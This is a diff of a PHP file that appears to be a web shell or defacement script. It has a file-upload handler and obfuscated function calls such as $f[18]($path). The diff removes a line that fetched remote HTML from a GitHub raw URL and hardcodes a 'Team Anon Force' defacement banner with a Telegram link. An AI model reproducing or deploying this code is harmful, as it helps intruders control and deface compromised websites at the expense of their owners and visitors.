@@ -233,8 +233,9 @@ if (isset($_FILES['uploadfile'])) {
 }
 
 $dirs = $f[18]($path);
-$url = "https://raw.githubusercontent.com/Professor6T9/ICBM/refs/heads/main/index.html"; 
-$content = file_get_contents($url); 
+$content = "<h1>Team Anon Force</h1>
+<h2>https://t.me/AnonNexus</h2>"; 
+
  
 if ($content === FALSE) { 
     // Handle error 
